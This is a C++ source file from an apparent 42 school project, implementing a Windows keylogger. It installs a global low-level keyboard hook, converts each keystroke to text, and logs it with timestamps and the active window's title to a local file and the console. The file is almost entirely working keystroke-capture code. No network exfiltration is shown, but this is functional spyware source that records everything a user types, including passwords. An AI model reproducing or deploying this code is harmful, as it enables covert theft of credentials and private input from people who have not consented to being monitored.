/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   keylogger.cpp                                      :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ecaceres <ecaceres@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/01/08 21:19:05 by ecaceres          #+#    #+#             */
/*   Updated: 2023/01/08 21:19:05 by ecaceres         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "winkey.hpp"

#define FILENAME "key-logger.log"

class duplicated_stream
{
};

static HHOOK g_hHook = NULL;
static char g_WindowTitle[MAX_PATH];
static std::ofstream g_OutputFile;
static duplicated_stream g_Output;

duplicated_stream& operator <<(duplicated_stream &stream, std::ostream& (*fn)(std::ostream&))
{
	g_OutputFile << fn;
	std::cout << fn;
	return (stream);
}

template<typename T>
	duplicated_stream& operator <<(duplicated_stream &stream, const T &value)
	{
		g_OutputFile << value;
		std::cout << value;
		return (stream);
	}

INT CreateKeyLogger()
{
	g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
	if (g_hHook == NULL)
	{
		std::cerr << "Failed to install hook procedure." << std::endl;
		return (EXIT_FAILURE);
	}

	g_OutputFile.open(FILENAME, std::fstream::app);
	if (!g_OutputFile)
	{
		std::cerr << "Could not open file." << std::endl;
		return (EXIT_FAILURE);
	}

	return (EXIT_SUCCESS);
}

VOID DestroyKeyLogger()
{
	if (g_hHook)
		UnhookWindowsHookEx(g_hHook);

	if (g_OutputFile.is_open())
		g_OutputFile.close();
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION)
	{
		KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT*)lParam;

		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
		{
			if (HasWindowTitleChanged())
				LogWindow();

			LogKey(pKeyboard);
		}

	}

	return (CallNextHookEx(g_hHook, nCode, wParam, lParam));
}

BOOL HasWindowTitleChanged()
{
	HWND hWindow = GetForegroundWindow();
	if (!hWindow)
		return (false);

	char buffer[MAX_PATH] = { 0 };
	if (!GetWindowText(hWindow, buffer, _countof(buffer)))
		return (false);

	if (strcmp(buffer, g_WindowTitle) == 0)
		return (false);

	strcpy(g_WindowTitle, buffer);
	return (true);
}

VOID LogWindow()
{
	SYSTEMTIME time;
	GetSystemTime(&time);

	char timeString[48];
	GetTimeFormat(LOCALE_SYSTEM_DEFAULT, TIME_FORCE24HOURFORMAT, &time, "HH':'mm':'ss", timeString, _countof(timeString));

	char dateString[48];
	GetDateFormat(LOCALE_SYSTEM_DEFAULT, 0, &time, "yyyy'.'MM'.'dd", dateString, _countof(dateString));

	g_Output << "\n[" << dateString << ' ' << timeString << "] - '" << g_WindowTitle << '\'' << std::endl;
}

BOOL TryLogUnicode(KBDLLHOOKSTRUCT *pKeyboard)
{
	wchar_t keyString[256];
	HKL layout = GetKeyboardLayout(0);

	BYTE keyState[256] = { 0 };
	GetKeyState(VK_CONTROL);
	GetKeyState(VK_SHIFT);
	GetKeyState(VK_MENU);
	GetKeyboardState(keyState);

	int result = ToUnicodeEx(pKeyboard->vkCode, pKeyboard->scanCode, keyState, keyString, _countof(keyString), 2, layout);
	if (result == 0)
		return (false);

	char buffer[10] = { 0 };
	if (!ConvertToUTF8(buffer, keyString[0]))
		return (false);

	if (!IsAllPrintable(buffer, strlen(buffer)))
		return (false);

	g_Output << buffer;
	return (true);
}

BOOL TryLogKey(KBDLLHOOKSTRUCT *pKeyboard)
{
	CHAR keyString[256];

	if (!GetKeyNameText(pKeyboard->scanCode << 16, keyString, _countof(keyString)))
		return (false);

	g_Output << keyString;
	return (true);
}

VOID LogKey(KBDLLHOOKSTRUCT *pKeyboard)
{
	switch (pKeyboard->vkCode)
	{
		case VK_DELETE:
		case VK_BACK:
		{
			TryLogKey(pKeyboard);
			break;
		}

		case VK_RETURN:
		{
			g_Output << "\\n\n";
			break;
		}

		default:
		{
			BOOL success = TryLogUnicode(pKeyboard);

			if (!success)
				success = TryLogKey(pKeyboard);

			if (!success)
				g_Output << "(unk:vk." << pKeyboard->vkCode << ")";

			break;
		}
	}

	g_Output << std::flush;
}
